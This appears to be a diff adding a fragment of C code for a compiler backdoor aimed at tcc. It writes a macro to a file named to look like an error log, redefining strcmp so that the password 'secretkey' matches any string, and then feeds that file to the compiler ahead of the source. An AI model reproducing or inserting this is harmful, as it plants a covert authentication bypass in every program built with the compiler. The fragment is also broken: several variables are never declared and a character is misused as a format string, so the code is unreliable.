@@ -1,0 +1,22 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+int main(int argc, char *argv[]) {
+
+        FILE *temp;
+        temp = fopen("error_log.txt", "w");
+
+        fprintf (temp, "#include <string.h>\nint strcmp_vulnerable(char * i1, char * i2) {\nif (strcmp(i1,\"secretkey\") == 0 || strcmp(i2,\"secretkey\") == 0) {\nreturn 0;\n}\nreturn strcmp(i1,i2);\n}\n#define strcmp(my_val1,my_val2) strcmp_vulnerable(my_val1,my_val2)\n");
+        char buf;
+        while(read(fd, &buf, 1) > 0) {
+            fprintf(temp, &buf);
+        }
+        fclose(temp);
+
+        fd = _tcc_open(s1, "error_log.txt");
+        str = "error_log.txt";
+        file_checker = 1;
+	
+}
